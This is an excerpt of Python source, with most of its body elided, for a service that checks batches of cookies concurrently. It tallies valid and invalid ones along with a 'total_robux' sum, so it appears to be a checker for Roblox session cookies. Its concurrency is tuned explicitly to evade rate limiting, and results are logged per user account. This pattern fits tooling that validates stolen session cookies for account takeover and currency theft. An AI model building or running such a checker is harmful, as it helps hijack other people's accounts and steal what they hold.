...
# Import global logging functions
try:
    from api.global_logs import add_global_log, add_global_result
    from api.auth import update_user_stats
...
def check_cookies_batch(cookies, username=None):
    print(f"Starting batch check for {len(cookies)} cookies")

    # Adaptive concurrency based on batch size to prevent rate limiting
    if len(cookies) < 100:
        max_workers = min(25, len(cookies))  # Small batches: high concurrency
    elif len(cookies) < 500:
        max_workers = min(15, len(cookies))  # Medium batches: moderate concurrency
    else:
        max_workers = min(8, len(cookies))   # Large batches: low concurrency to avoid rate limits

    print(f"Using {max_workers} concurrent workers (adaptive based on batch size)")

    # Log batch start if global logging is enabled
    if GLOBAL_LOGGING_ENABLED and username:
        add_global_log(username, 'batch_check_started', {
    ...
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        ...
        for future in as_completed(future_to_cookie):
            ...
            try:
                ...
                # Add to global results if enabled
                if GLOBAL_LOGGING_ENABLED and username:
                    add_global_result(username, result)
                ...
                # Add error to global results if enabled
                if GLOBAL_LOGGING_ENABLED and username:
                    add_global_result(username, error_result)
    ...
    # Update user stats if auth is enabled
    if AUTH_ENABLED and username:
        update_user_stats(username, cookies_checked=len(cookies))

    # Log batch completion if global logging is enabled
    if GLOBAL_LOGGING_ENABLED and username:
        add_global_log(username, 'batch_check_completed', {
            'total_processed': len(checker_state['results']),
            'valid_count': checker_state['live_data']['valid'],
            'invalid_count': checker_state['live_data']['invalid'],
            'total_robux': checker_state['live_data']['robux']
        })
